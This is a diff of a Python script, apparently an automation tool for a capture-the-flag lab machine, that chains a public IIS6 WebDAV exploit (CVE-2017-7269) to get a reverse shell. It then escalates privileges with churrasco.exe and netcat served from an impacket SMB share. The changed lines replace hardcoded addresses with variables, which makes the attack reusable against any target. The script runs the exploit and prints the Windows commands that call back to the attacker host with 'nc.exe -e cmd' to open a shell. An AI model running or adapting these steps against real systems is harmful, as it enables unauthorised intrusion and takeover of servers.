@@ -55,7 +55,7 @@ tmsg = Tmsg()
 ln = Fore.GREEN+"========================================="+Fore.RESET
 
 def menu_panel():
-    options=["[+] svc-alfresco","[+] Administrator", "[-] exit"]
+    options=["[+] iis_user","[+] Administrator", "[-] exit"]
     opcion = select(
         "Selecciona una opción:",
         choices=options,
@@ -116,17 +116,17 @@ def iis_user_default():
     commands_send("cd iis6-exploit-2017-CVE-2017-7269 && mv 'iis6 reverse shell' ii6exploit.py")
     print(tmsg,Fore.RED + f"[Exploit - iis_user] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "sudo nc -nlvp 443");cm.sleep(.5)
     input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [iis_user] > " + Fore.WHITE + f"Press ENTER to continue...")
-    print(commands_send("cd iis6-exploit-2017-CVE-2017-7269 && python2.7 ii6exploit.py 10.10.10.14 80 10.10.16.8 443"))
+    print(commands_send(f"cd iis6-exploit-2017-CVE-2017-7269 && python2.7 ii6exploit.py {target_machine} 80 {machine_ip} 443"))
 
 
 def administrator_user_content():
     commands_send("cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .");cm.sleep(1)
     commands_send("wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe");cm.sleep(2)
     print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Windows > " + Fore.LIGHTCYAN_EX + "cd C:\Windows\Temp");cm.sleep(.5)
-    print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Windows > " + Fore.LIGHTCYAN_EX + "copy \\10.10.16.8\smbFolder\churrasco.exe");cm.sleep(.5)
+    print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Windows > " + Fore.LIGHTCYAN_EX + f"copy \\{machine_ip}\smbFolder\churrasco.exe");cm.sleep(.5)
     print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Linux > " + Fore.LIGHTCYAN_EX + "sudo nc -nlvp 443");cm.sleep(.5)
-    print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Windows > " + Fore.LIGHTCYAN_EX + '.\churrasco.exe "\\10.10.16.8\smbFolder\\nc.exe -e cmd 10.10.16.8 443"');cm.sleep(.5)
-    print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Windows > " + Fore.LIGHTCYAN_EX + "copy \\10.10.16.8\smbFolder\\nc.exe");cm.sleep(.5)
+    print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Windows > " + Fore.LIGHTCYAN_EX + f'.\churrasco.exe "\\{machine_ip}\smbFolder\\nc.exe -e cmd {machine_ip} 443"');cm.sleep(.5)
+    print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Windows > " + Fore.LIGHTCYAN_EX + f"copy \\{machine_ip}\smbFolder\\nc.exe");cm.sleep(.5)
     commands_send("sudo impacket-smbserver smbFolder $(pwd)")
 
 #------------------------------------------------------------------------
